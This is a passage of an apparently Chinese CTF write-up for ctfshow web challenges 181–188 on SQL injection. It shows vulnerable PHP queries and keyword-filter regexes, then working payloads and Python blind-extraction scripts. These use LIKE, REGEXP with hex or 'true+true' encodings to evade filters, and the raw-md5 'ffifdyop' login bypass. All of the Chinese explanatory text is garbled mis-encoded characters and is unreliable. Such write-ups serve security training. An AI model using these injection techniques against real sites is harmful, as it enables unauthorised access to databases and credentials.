class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-built_in">limit</span> 1;<br>å‰é¢æ»¡è¶³æ¡ä»¶<span class="hljs-built_in">id</span>=0çš„è®°å½•ä¸å­˜åœ¨ï¼Œæ•…è¯¥è¯­å¥å¯ç®€åŒ–ä¸º<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span>,username,password from ctfshow_user <span class="hljs-built_in">where</span> (0) or(<span class="hljs-built_in">id</span>=26)and<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-built_in">limit</span> 1;<br>å…ˆè®¡ç®—andï¼Œå†è®¡ç®—orï¼Œæœ€åå¾—åˆ°æ»¡è¶³<span class="hljs-built_in">id</span>=26çš„è®°å½•<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-182ï¼ˆé€»è¾‘è¿ç®—ä¼˜å…ˆçº§ã€ç›²æ³¨ï¼‰"><a href="#web-182ï¼ˆé€»è¾‘è¿ç®—ä¼˜å…ˆçº§ã€ç›²æ³¨ï¼‰" class="headerlink" title="web-182ï¼ˆé€»è¾‘è¿ç®—ä¼˜å…ˆçº§ã€ç›²æ³¨ï¼‰"></a>web-182ï¼ˆé€»è¾‘è¿ç®—ä¼˜å…ˆçº§ã€ç›²æ³¨ï¼‰</h2><p>è¿”å›é€»è¾‘</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select</span>|<span class="hljs-string">flag/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure>

<p>æ¯”ä¸Šé¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªflagï¼Œä¾ç„¶å¯ä»¥ç”¨ä¸Šé¢˜çš„payloadï¼Œæˆ–è€…ç”¨ç›²æ³¨</p>
<p>payloadï¼š</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">0</span><span class="hljs-symbol">&#x27;or</span>(id=<span class="hljs-number">26</span>)<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=&#x27;<span class="hljs-number">1</span><br><br>ç›²æ³¨payloadï¼Œåœ¨<span class="hljs-keyword">and</span>åå†™ç›²æ³¨è¯­å¥å³å¯<br>-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;or</span>(id=<span class="hljs-number">26</span>)andif(xxxx)<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-183ï¼ˆcountã€pythonè„šæœ¬è¿›è¡Œlikeæˆ–æ­£åˆ™åŒ¹é…ï¼‰"><a href="#web-183ï¼ˆcountã€pythonè„šæœ¬è¿›è¡Œlikeæˆ–æ­£åˆ™åŒ¹é…ï¼‰" class="headerlink" title="web-183ï¼ˆcountã€pythonè„šæœ¬è¿›è¡Œlikeæˆ–æ­£åˆ™åŒ¹é…ï¼‰"></a>web-183ï¼ˆcountã€pythonè„šæœ¬è¿›è¡Œlikeæˆ–æ­£åˆ™åŒ¹é…ï¼‰</h2><p>æºç ï¼š</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">file</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">or</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">select</span>|<span class="hljs-string">and</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">into/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœ</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°<br>      <span class="hljs-variable">$user_count</span> = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>è¿™é‡Œä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„tableNameå€¼è¿›è¡Œsqlè¯­å¥çš„æ‹¼æ¥ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‰é¢çš„countåŠ likeåŒ¹é…æ¥çˆ†ç ´flag</p>
<p>pythonè„šæœ¬ï¼š</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://c08bee29-77ce-4dc6-94e9-7dd98c17a11c.challenge.ctf.show/select-waf.php&#x27;</span><br>str = <span class="hljs-string">&#x27;&#123;1234567890-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span>			<span class="hljs-comment">//çˆ†ç ´å­—å…¸</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span>	<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):			<span class="hljs-comment">//çˆ†ç ´ä½æ•°ï¼Œå¦‚æœä¸ç¡®å®šflagçš„ä½æ•°å¯ä»¥è°ƒå¤§ç‚¹</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str:<br>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&#x27;`ctfshow_user`where`pass`like&quot;ctfshow&#123;&#125;%&quot;&#x27;</span>.format(flag+i)&#125;	<br>        r = requests.post(<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>,url=url)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&#x27;$user_count = 1;&#x27;</span>) &gt; <span class="hljs-number">0</span>:		<span class="hljs-comment">//å¦‚æœåŒ¹é…æˆåŠŸï¼Œä¼šè¾“å‡º$user_count = 1</span><br>            flag+=i<br>            print(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span>		<span class="hljs-comment">//æ²¡åŒ¹é…åˆ°ç›´æ¥è·³è¿‡</span><br></code></pre></td></tr></table></figure>

<p><strong>æ³¨æ„ï¼šåœ¨æ‹¼æ¥sqlè¯­å¥çš„æ—¶å€™ï¼Œè¡¨åå’Œåˆ—åè¦ç”¨åå¼•å·&#96;å›´èµ·æ¥ï¼Œæˆ–è€…ä½¿ç”¨åœ†æ‹¬å·()æ‹¬èµ·æ¥ï¼Œé¿å…sqlè¯­å¥æ— æ³•æ‰§è¡Œï¼Œå› ä¸ºsqlä¸­ä¸èƒ½å­˜åœ¨ç©ºæ ¼</strong></p>
<hr>
<h2 id="web-184ï¼ˆgroup-byç»•è¿‡whereè¿‡æ»¤ã€åå…­è¿›åˆ¶ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤ã€regexpï¼‰"><a href="#web-184ï¼ˆgroup-byç»•è¿‡whereè¿‡æ»¤ã€åå…­è¿›åˆ¶ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤ã€regexpï¼‰" class="headerlink" title="web-184ï¼ˆgroup byç»•è¿‡whereè¿‡æ»¤ã€åå…­è¿›åˆ¶ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤ã€regexpï¼‰"></a>web-184ï¼ˆgroup byç»•è¿‡whereè¿‡æ»¤ã€åå…­è¿›åˆ¶ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤ã€regexpï¼‰</h2><p>whereè¢«ç¦ç”¨äº†ã€‚ã€‚ã€‚ç”¨group byä»£æ›¿<br>åŒå¼•å·å•å¼•å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œ<strong>æ”¹ä¸ºåå…­è¿›åˆ¶è¿›è¡Œç»•è¿‡</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://140e0424-a88d-4d4c-831f-b3d9390a7278.challenge.ctf.show/select-waf.php&quot;</span><br><br>flagstr = <span class="hljs-string">&quot;&#123;abcdefghijklmnopqrstuvwxyz-0123456789&#125;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    a = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        a += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(x)).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> a<br>    <br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>        data = &#123;<br>            <span class="hljs-string">&quot;tableName&quot;</span>:<span class="hljs-string">&quot;ctfshow_user group by pass having pass regexp(0x&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(to_hex(flag + x))<br>        &#125;<br>        r = requests.post(url,data=data)<br><br>        <span class="hljs-keyword">if</span> (r.text.find(<span class="hljs-string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="hljs-number">0</span>):<br>            flag += x<br>            <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">1ã€è¿™é‡Œ<span class="hljs-keyword">where</span>è¢«è¿‡æ»¤äº†æ‰€ä»¥å¯ä»¥ç”¨<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> pass <span class="hljs-keyword">having</span> passè¯­å¥ä»£æ›¿<span class="hljs-keyword">where</span>è¿›è¡Œæ¡ä»¶æŸ¥è¯¢<br>2ã€ç”±äºè¿‡æ»¤äº†å•åŒå¼•å·æ‰€ä»¥è¦ä½¿ç”¨reg<span class="hljs-meta">exp</span>(0x&#123;&#125;)çš„æ ¼å¼ï¼Œå› ä¸ºåå…­è¿›åˆ¶ä¹Ÿèƒ½åœ¨mysqlä¸­è¢«è§£æï¼Œä¸”ä¸ç”¨ä½¿ç”¨å•åŒå¼•å·<br>æ¯”å¦‚regexp <span class="hljs-string">&#x27;a&#x27;</span>å°±ç›¸å½“äºreg<span class="hljs-meta">exp</span>(0x61)<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-185ï¼ˆpythonè„šæœ¬æ­£åˆ™åŒ¹é…ã€æ•°å­—è¿‡æ»¤ç»•è¿‡ï¼‰"><a href="#web-185ï¼ˆpythonè„šæœ¬æ­£åˆ™åŒ¹é…ã€æ•°å­—è¿‡æ»¤ç»•è¿‡ï¼‰" class="headerlink" title="web-185ï¼ˆpythonè„šæœ¬æ­£åˆ™åŒ¹é…ã€æ•°å­—è¿‡æ»¤ç»•è¿‡ï¼‰"></a>web-185ï¼ˆpythonè„šæœ¬æ­£åˆ™åŒ¹é…ã€æ•°å­—è¿‡æ»¤ç»•è¿‡ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/\<span class="hljs-symbol">*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\0x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">file</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">or</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">select</span>|<span class="hljs-string">and</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">into</span>|<span class="hljs-string">where</span>|<span class="hljs-string">\x26</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">union</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">sleep</span>|<span class="hljs-string">benchmark/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br></code></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœ</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°<br>      <span class="hljs-variable">$user_count</span> = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†æ•°å­—ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ„é€ å‡ºæ•°å­—</p>
<table>
<thead>
<tr>
<th>expression</th>
<th>number</th>
</tr>
</thead>
<tbody><tr>
<td>false</td>
<td>0</td>
</tr>
<tr>
<td>true</td>
<td>1</td>
</tr>
<tr>
<td>true+true</td>
<td>2</td>
</tr>
<tr>
<td>floor(pi())</td>
<td>3</td>
</tr>
<tr>
<td>ceil(pi())</td>
<td>4</td>
</tr>
<tr>
<td>floor(pi())+true</td>
<td>5</td>
</tr>
<tr>
<td>floor(pi())+floor(pi())</td>
<td>6</td>
</tr>
<tr>
<td>floor(pi())+ceil(pi())</td>
<td>7</td>
</tr>
<tr>
<td>ceil(pi())+ceil(pi())</td>
<td>8</td>
</tr>
<tr>
<td>floor(pi())*floor(pi())</td>
<td>9</td>
</tr>
<tr>
<td>floor(pi())*floor(pi())+true</td>
<td>10</td>
</tr>
</tbody></table>
<p><strong>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨â€true+trueâ€çš„å½¢å¼å³å¯æ„é€ å‡º0-9çš„æ•°å­—</strong></p>
<p><strong>ç„¶åä½¿ç”¨concatè¿›è¡Œè¿æ¥ï¼Œå¹¶ä¸”è¿‡æ»¤äº† <code>&quot;</code> <code>&#39;</code> ä¸èƒ½ä½¿ç”¨ concat(â€˜strâ€™,â€˜strâ€™) è¿›è¡Œæ‹¼æ¥ï¼Œå­—ç¬¦ä¸æ•°å­—éƒ½éœ€è¦è‡ªå·±æ„é€  é€šè¿‡chr() å‡½æ•°å°†æ•°å­—è½¬ä¹‰ä¸ºå­—ç¬¦</strong></p>
<p>pythonè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://ec8ccd75-39a8-405b-a4b7-002d937996d0.challenge.ctf.show/select-waf.php&quot;</span><br>flagstr = <span class="hljs-string">&quot;&#123;abcdefghijklmnopqrstuvwxyz-0123456789&#125;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renum</span>(<span class="hljs-params">n</span>):<br>    a = <span class="hljs-string">&#x27;true&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>):	<span class="hljs-comment">#å› ä¸ºæˆ‘ä»¬å·²ç»æŠŠaèµ‹å€¼ä¸ºtrueæ‰€ä»¥åªéœ€è¦å¾ªç¯n-1æ¬¡å³å¯</span><br>        a += <span class="hljs-string">&#x27;+true&#x27;</span>		<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>:]<br>   <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renum_to_str</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n:<br>        <span class="hljs-built_in">str</span> += <span class="hljs-string">&quot;,chr(&quot;</span>+renum(<span class="hljs-built_in">ord</span>(i))+<span class="hljs-string">&quot;)&quot;</span>	<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>[<span class="hljs-number">1</span>:]			<span class="hljs-comment">#éœ€è¦å»æ‰ç¬¬0ä½çš„é€—å·,æ‰€ä»¥è¿”å›çš„æ˜¯str[1:]</span><br>    <br><span class="hljs-comment">#ordå…ˆå°†å­—ç¬¦è½¬æ¢ä¸ºasciiç ï¼Œç„¶åå†é€šè¿‡renumè½¬æ¢ä¸ºtrue+trueå½¢å¼çš„asciiç ï¼Œç„¶åæ‹¼æ¥æˆchr(&quot;true+true+...&quot;)çš„å½¢å¼ï¼Œå°±èƒ½ç»•è¿‡æ•°å­—è¿‡æ»¤äº†ï¼Œåœ¨sqlä¸­ä¼šè¢«ç»„æˆchr(&quot;true+true+...&quot;),chr(&quot;true+true+...&quot;)å½¢å¼ï¼Œç„¶åç»è¿‡concatå‡½æ•°æ‹¼æ¥å³å¯æˆä¸ºå­—ç¬¦ä¸²</span><br><br>flag = <span class="hljs-string">&quot;ctfshow&#123;&quot;</span>	<span class="hljs-comment">#åˆå§‹åŒ–flagå½¢å¼</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>        data = &#123;<span class="hljs-string">&quot;tableName&quot;</span>:<span class="hljs-string">&quot;ctfshow_user group by pass having pass regexp(concat(&#123;&#125;))&quot;</span>.<span class="hljs-built_in">format</span>(renum_to_str(flag+x))	<span class="hljs-comment">#è¿˜æ˜¯ä½¿ç”¨regexpæ­£åˆ™åŒ¹é…flag</span><br>                &#125;<br>        r = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&#x27;$user_count = 1;&#x27;</span>) &gt; <span class="hljs-number">0</span>:<br>            flag += x<br>            <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-186ï¼ˆåŒä¸Šï¼‰"><a href="#web-186ï¼ˆåŒä¸Šï¼‰" class="headerlink" title="web-186ï¼ˆåŒä¸Šï¼‰"></a>web-186ï¼ˆåŒä¸Šï¼‰</h2><hr>
<h2 id="web-187ï¼ˆmysqlç‰¹æ€§ã€md5ï¼‰"><a href="#web-187ï¼ˆmysqlç‰¹æ€§ã€md5ï¼‰" class="headerlink" title="web-187ï¼ˆmysqlç‰¹æ€§ã€md5ï¼‰"></a>web-187ï¼ˆmysqlç‰¹æ€§ã€md5ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>  $sql = &quot;<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>= <span class="hljs-string">&#x27;$password&#x27;</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">//åªæœ‰adminå¯ä»¥è·å¾—flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>!=<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;ç”¨æˆ·åä¸å­˜åœ¨&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>åˆ†æè¿”å›é€»è¾‘å‘ç°æˆ‘ä»¬ä¼ å…¥çš„$usernameå¿…é¡»ä¸ºadminæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥sqlæŸ¥è¯¢ï¼Œå¦åˆ™å°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥åªèƒ½åœ¨passwordä¸Šå…¥æ‰‹ã€‚</p>
<p><strong>MySQLçš„ä¸€ä¸ªç‰¹æ€§ï¼š åªè¦â€™orâ€™åé¢çš„å­—ç¬¦ä¸²ä¸ºä¸€ä¸ªéé›¶çš„æ•°å­—å¼€å¤´éƒ½ä¼šè¿”å›True</strong></p>
<p><strong>å…³é”®ä»£ç ï¼š</strong></p>
<p><strong>$password &#x3D; md5($_POST[â€˜passwordâ€™],true);</strong></p>
<p><strong>&#x2F;&#x2F; å¦‚æœå¯é€‰çš„binaryè¢«è®¾ç½®ä¸ºtrue é‚£ä¹ˆmd5æ‘˜è¦å°†ä»¥16å­—ç¬¦é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›</strong></p>
<p><strong>&#x2F;&#x2F; é‚£ä¹ˆå¦‚æœ md5($_POST[â€˜passwordâ€™],true) çš„è¿”å›å€¼ä¸º â€˜orâ€™1(é™¤0å¤–ä»»æ„æ•°å­—å¼€å¤´)xxx SQLè¯­å¥å°†è¢«æ‹¼æ¥ä¸º</strong></p>
<p><strong>$sql&#x3D;â€select count(*) from ctfshow_user where username&#x3D;â€™adminâ€™ and password&#x3D;â€™â€™orâ€™1xxxâ€™â€;</strong></p>
<p><strong>&#x2F;&#x2F; å¯†ç è¾“å…¥ ffifdyop</strong></p>
<p><strong>md5(â€œffifdyopâ€,true) &#x3D;&gt; â€˜orâ€™6Ã‰]Â™Ã©!r,Ã¹Ã­b</strong></p>
<p>payloadï¼š</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">ç”¨æˆ·åï¼š<span class="hljs-literal">admin</span><br>å¯†ç ï¼šffifdyop<br></code></pre></td></tr></table></figure>

<p>ç‚¹å‡»ç™»å½•å¹¶æŠ“åŒ…æ”¾åˆ°é‡æ”¾å™¨ä¸­ç„¶åå‘é€ï¼Œåœ¨å“åº”åŒ…ä¸­å°±èƒ½çœ‹åˆ°flag</p>
<hr>
<h2 id="web-188ï¼ˆmysqlå¼±ç±»å‹æ¯”è¾ƒï¼‰"><a href="#web-188ï¼ˆmysqlå¼±ç±»å‹æ¯”è¾ƒï¼‰" class="headerlink" title="web-188ï¼ˆmysqlå¼±ç±»å‹æ¯”è¾ƒï¼‰"></a>web-188ï¼ˆmysqlå¼±ç±»å‹æ¯”è¾ƒï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select pass from ctfshow_user where username = <span class="hljs-subst">&#123;$username&#125;</span>&quot;</span>;<br>    <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ç”¨æˆ·åæ£€æµ‹</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="hljs-variable">$username</span>))&#123;<br>  <span 